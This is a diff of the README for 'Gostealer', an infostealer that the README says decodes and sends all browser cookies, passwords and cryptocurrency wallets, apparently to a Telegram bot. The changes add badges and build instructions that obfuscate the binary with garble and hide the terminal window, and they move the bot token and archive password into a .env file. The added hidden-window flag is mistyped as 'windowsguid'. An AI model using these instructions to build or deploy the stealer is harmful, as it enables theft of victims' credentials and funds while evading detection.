@@ -1,6 +1,10 @@
 # Gostealer
 Gostealer decodes and sends all cookies, passwords and cryptocurrency wallets from chromium (and not only) browsers.
 
+![Dependencies](https://img.shields.io/badge/dependencies-up%20to%20date-brightgreen.svg)
+![Contributions welcome](https://img.shields.io/badge/contributions-welcome-orange.svg)
+[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+
 <img src="https://github.com/4kord/gostealer/blob/main/telegram.png?raw=true" alt="Telegram" width="500">
 
 #### Supported browsers
@@ -45,14 +49,16 @@ brew install golang
 ```sh
 # Change current directory to the cloned one and build
 cd gostealer
-garble -seed=random build -ldflags -H=windowsgui # Make sure garble is installed
+garble -seed=random build
+
+# If you don't want to show the terminal use -ldflags -H=windowsgui
+garble -seed=random build -ldflags -H=windowsguid
 ```
 And that's it!
 
 Look at this [repository](https://github.com/burrowers/garble) to find out how to install garble 
 
-## Usage
+## Configuration
 
 You might want to change **bot token** and **archive password** before building
-- Bot token is stored in *main.go*
-- Archive password is stored in *utils/zip.go*
+Rename .env.example to .env and change values you need
